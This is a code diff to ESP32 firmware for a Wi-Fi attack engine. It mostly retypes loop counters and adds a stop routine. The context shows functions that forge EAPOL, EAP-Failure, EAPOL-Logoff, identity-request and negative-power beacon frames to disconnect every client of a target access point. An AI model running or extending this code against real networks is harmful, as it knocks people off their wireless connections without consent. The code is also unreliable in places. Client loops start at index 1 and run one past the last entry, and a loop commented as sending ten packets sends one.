@@ -12,7 +12,7 @@ static const char *TAG = "WIFI_ATTACKS:";
 static client_t clients[MAX_CLIENTS];
 static SemaphoreHandle_t clients_semaphore;
 static SemaphoreHandle_t target_semaphore;
-static int num_clients = 0;
+static uint8_t num_clients = 0;
 static target_info_t target = { 0 };
 
 
@@ -33,7 +33,7 @@ static void add_client_to_list(const uint8_t *mac)
     if (xSemaphoreTake(clients_semaphore, pdMS_TO_TICKS(CLIENT_SEM_WAIT)) == pdTRUE) 
     {
         /* Dont add duplicates */
-        for (int i = 0; i < num_clients; i++) {
+        for (uint8_t i = 0; i < num_clients; i++) {
             if (memcmp(clients[i].mac, mac, 6) == 0) {
                 xSemaphoreGive(clients_semaphore);
                 return;
@@ -98,6 +98,29 @@ void wifi_attack_engine_start(target_info_t *_target)
     filter.filter_mask = WIFI_PROMIS_CTRL_FILTER_MASK_ALL;
     esp_wifi_set_promiscuous_ctrl_filter(&filter);
     esp_wifi_set_promiscuous_rx_cb(promiscuous_callback);
+}
+
+
+void wifi_attack_engine_stop(void)
+{
+    /* Disable promiscuous mode */
+    esp_wifi_set_promiscuous(false);
+
+    /* Delete semaphore */
+    if (clients_semaphore != NULL) 
+    {
+        vSemaphoreDelete(clients_semaphore);
+        clients_semaphore = NULL;
+    }
+    if (target_semaphore != NULL) 
+    {
+        vSemaphoreDelete(target_semaphore);
+        target_semaphore = NULL;
+    }
+
+    /* Reset Global variables */
+    memset(clients, 0, sizeof(clients));
+    memset(&target, 0, sizeof(target_info_t));
 }
 
 
@@ -179,12 +202,12 @@ void wifi_attack_deauth_client_invalid_PMKID(void)
     memcpy(&eapol_packet_invalid_PMKID[10], target_local.bssid, 6);    // Source Address
     memcpy(&eapol_packet_invalid_PMKID[16], target_local.bssid, 6);    // BSSID
 
-    for (int i = 0; i < 8; i++) {
+    for (uint8_t i = 0; i < 8; i++) {
         eapol_packet_invalid_PMKID[35 + i] = (replay_counter >> (56 - i * 8)) & 0xFF;
     }
 
     /* Skip broadcast address */
-    for (int i = 1; i <= num_clients; i++) 
+    for (uint8_t i = 1; i <= num_clients; i++) 
     {
         memcpy(&eapol_packet_invalid_PMKID[4], clients[i].mac, 6); // Destination Address (Client MAC)
         esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_invalid_PMKID, sizeof(eapol_packet_invalid_PMKID), false);
@@ -235,16 +258,16 @@ void wifi_attack_deauth_client_bad_msg1(void)
     memcpy(&eapol_packet_bad_msg1[10], target_local.bssid, 6);    // Source Address
     memcpy(&eapol_packet_bad_msg1[16], target_local.bssid, 6);    // BSSID
     /* Generate random Nonce */
-    for (int i = 0; i < 32; i++) {
+    for (uint8_t i = 0; i < 32; i++) {
         eapol_packet_bad_msg1[43 + i] = esp_random() & 0xFF; // Inserisce il valore nel campo Key Nonce
     }
     /* Update replay counter */
-    for (int i = 0; i < 8; i++) {
+    for (uint8_t i = 0; i < 8; i++) {
         eapol_packet_bad_msg1[35 + i] = (replay_counter >> (56 - i * 8)) & 0xFF;
     }
 
     /* Skip broadcast address */
-    for (int i = 1; i <= num_clients; i++) 
+    for (uint8_t i = 1; i <= num_clients; i++) 
     {
         memcpy(&eapol_packet_bad_msg1[4], clients[i].mac, 6); // Destination Address (Client MAC)
         esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
@@ -284,7 +307,7 @@ void wifi_attack_deauth_ap_eapol_logoff(void)
     memcpy(&eapol_logoff_packet[16], target_local.bssid, 6);    // BSSID
 
     /* Skip broadcast address */
-    for (int i = 1; i <= num_clients; i++) 
+    for (uint8_t i = 1; i <= num_clients; i++) 
     {
         memcpy(&eapol_logoff_packet[4], clients[i].mac, 6); // Destination Address (Client MAC)
         esp_wifi_80211_tx(WIFI_IF_AP, eapol_logoff_packet, sizeof(eapol_logoff_packet), false);
@@ -327,7 +350,7 @@ void wifi_attack_deauth_client_eap_failure(void)
     memcpy(&eap_failure_packet[16], target_local.bssid, 6);    // BSSID
 
     /* Skip broadcast address */
-    for (int i = 1; i <= num_clients; i++) 
+    for (uint8_t i = 1; i <= num_clients; i++) 
     {
         memcpy(&eap_failure_packet[4], clients[i].mac, 6); // Destination Address (Client MAC)
         esp_wifi_80211_tx(WIFI_IF_AP, eap_failure_packet, sizeof(eap_failure_packet), false);
@@ -370,7 +393,7 @@ void wifi_attack_deauth_client_eap_rounds(void)
     memcpy(&eap_identity_request_packet[16], target_local.bssid, 6);    // BSSID
     
     /* Skip broadcast address */
-    for (int i = 1; i <= num_clients; i++) 
+    for (uint8_t i = 1; i <= num_clients; i++) 
     {
         memcpy(&eap_identity_request_packet[4], clients[i].mac, 6); // Destination Address (Client MAC)
         for(uint8_t identity = 0; identity < 255; identity++ )
@@ -414,7 +437,7 @@ void wifi_attack_deauth_ap_eapol_start(void)
     memcpy(&eapol_start_packet[16], target_local.bssid, 6);    // BSSID
 
     /* Skip broadcast address */
-    for (int i = 1; i <= num_clients; i++) 
+    for (uint8_t i = 1; i <= num_clients; i++) 
     {
         memcpy(&eapol_start_packet[4], clients[i].mac, 6); // Destination Address (Client MAC)
         for(uint8_t burst = 0; burst < 3; burst++ )
@@ -449,7 +472,7 @@ void wifi_attack_deauth_client_negative_tx_power(void)
     };
     memcpy(&beacon_frame_negative_tx[10], target_local.bssid, 6);    // Source Address
     memcpy(&beacon_frame_negative_tx[16], target_local.bssid, 6);    // BSSID 
-    int offset = 36;
+    uint16_t offset = 36;
     // 2. Tagged Parameters
     // SSID Parameter
     beacon_frame_negative_tx[offset++] = 0x00;          // SSID Tag Number
@@ -504,7 +527,7 @@ void wifi_attack_deauth_client_negative_tx_power(void)
     beacon_frame_negative_tx[offset++] = -1;             // Power Constraint (Example: 3 dBm)
 
     /* Spam 10 packets */
-    for (int i = 10; i <= 10; i++) 
+    for (uint8_t i = 10; i <= 10; i++) 
     {
         esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_negative_tx, offset, false);
         vTaskDelay(pdMS_TO_TICKS(2));
